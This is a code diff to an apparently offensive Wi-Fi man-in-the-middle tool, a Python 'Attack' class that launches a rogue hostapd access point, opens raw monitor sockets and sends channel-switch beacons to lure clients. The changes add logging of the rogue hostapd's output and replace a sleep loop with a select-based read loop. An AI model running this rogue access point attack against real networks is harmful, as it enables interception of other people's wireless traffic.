@@ -321,6 +321,27 @@ class Attack():
 			self.apmac = self.beacon.addr2
 
 
+	def handle_hostapd_out(self):
+		# hostapd always prints lines so this should not block
+		line = self.hostapd.stdout.readline()
+		if line == "":
+			log(ERROR, "Rogue hostapd instances unexpectedly closed")
+			quit(1)
+
+		if line.startswith(">>>> ".encode()):
+			log(STATUS, "Rogue hostapd: " + line[5:].strip().decode())
+		elif line.startswith(">>> ".encode()):
+			log(DEBUG, "Rogue hostapd: " + line[4:].strip().decode())
+		# This is a bit hacky but very usefull for quick debugging
+		elif "fc=0xc0".encode() in line:
+			log(WARNING, "Rogue hostapd: " + line.strip().decode())
+		elif "sta_remove".encode() in line or "Add STA".encode() in line or "disassoc cb".encode() in line or "disassocation: STA".encode() in line:
+			log(DEBUG, "Rogue hostapd: " + line.strip().decode())
+		else:
+			log(ALL, "Rogue hostapd: " + line.strip().decode())
+		self.hostapd_log.write(datetime.now().strftime('[%H:%M:%S] ') + line.decode())
+
+
 	def run(self):
 		self.configure_interfaces()
 		self.sock_real = MitmSocket(type=ETH_P_ALL, iface=self.nic_real_mon)
@@ -342,18 +363,18 @@ class Attack():
 
 		with open(os.path.realpath(os.path.join(self.script_path, "./hostapd-2.9/hostapd_rogue.conf")), "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
-		hostapd_path = os.path.realpath(f'{os.path.join(self.script_path, "./hostapd-2.9/hostapd")} {os.path.realpath(os.path.join(self.script_path, "./hostapd-2.9/hostapd_rogue.conf"))} -dd -K')
+		hostapd_path = f'{os.path.realpath(os.path.join(self.script_path, "./hostapd-2.9/hostapd"))} {os.path.realpath(os.path.join(self.script_path, "./hostapd-2.9/hostapd_rogue.conf"))} -dd -K'
 		self.hostapd = subprocess.Popen(hostapd_path, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+
 		
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
 		flag_while = 1
 		time.sleep(10)
 		self.send_csa_beacon(numbeacons=4)
-		while(True):
-			
+		while True:
+			sel = select.select([self.hostapd.stdout], [], [], 0.1)
+			if self.hostapd.stdout in sel[0]: self.handle_hostapd_out()
 			flag_while += 5
-			time.sleep(1000000)
-			self.send_csa_beacon(numbeacons=4)
 			
 
 	def send_csa_beacon(self, numbeacons=1, target=None, silent=False):
